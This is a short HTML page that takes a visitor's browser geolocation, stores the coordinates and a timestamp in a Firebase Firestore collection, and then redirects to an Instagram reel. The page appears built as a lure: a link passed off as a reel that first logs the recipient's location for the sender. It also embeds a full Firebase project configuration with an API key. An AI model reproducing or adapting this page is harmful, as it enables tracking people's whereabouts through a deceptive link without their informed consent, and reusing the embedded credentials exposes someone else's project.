<!DOCTYPE html>
<html>
<head>
  <title>Log Location</title>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
</head>
<body>
<h2>Logging your location...</h2>
<div id="coords">Fetching location...</div>

<script>
  // ✅ Replace this with your actual Firebase config
  const firebaseConfig = {
  apiKey: "AIzaSyDgO0EMocR1LmOQFwFCvCU7QyMeAieuruA",
  authDomain: "location-logger-53d22.firebaseapp.com",
  projectId: "location-logger-53d22",
  storageBucket: "location-logger-53d22.firebasestorage.app",
  messagingSenderId: "822436256718",
  appId: "1:822436256718:web:4f026aa17bef44c71f699f"
};

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  navigator.geolocation.getCurrentPosition(
    function (position) {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const timestamp = new Date().toISOString();

      document.getElementById("coords").innerText =
        `Lat: ${lat}, Lng: ${lng}`;

      db.collection("locations").add({
        lat,
        lng,
        timestamp
      }).then(() => {
        // ✅ Wait 10 seconds then redirect
        setTimeout(() => {
          window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
        }, 10000);
      }).catch((err) => {
        console.error("Logging failed", err);
        window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
      });
    },
    function () {
      alert("Location access denied.");
    }
  );
</script>
</body>
</html>
